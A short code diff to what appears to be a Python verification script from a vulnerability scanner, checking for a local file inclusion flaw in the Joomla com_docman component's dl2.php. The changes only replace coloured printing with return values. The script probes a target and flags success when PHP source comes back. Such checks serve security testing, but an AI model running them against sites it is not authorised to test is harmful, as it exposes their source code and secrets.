@@ -8,8 +8,8 @@ description: joomla组件com_docman 文件com_docman/dl2.php中参数file被base
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class joomla_com_docman_lfi_BaseVerify:
     def __init__(self, url):
@@ -24,12 +24,12 @@ class joomla_com_docman_lfi_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if req.status_code == 200 and r"<?php" in req.text:
-                cprint("[+]存在joomla组件com_docman本地文件包含漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在joomla组件com_docman本地文件包含漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = joomla_com_docman_lfi_BaseVerify(sys.argv[1])
     testVuln.run()
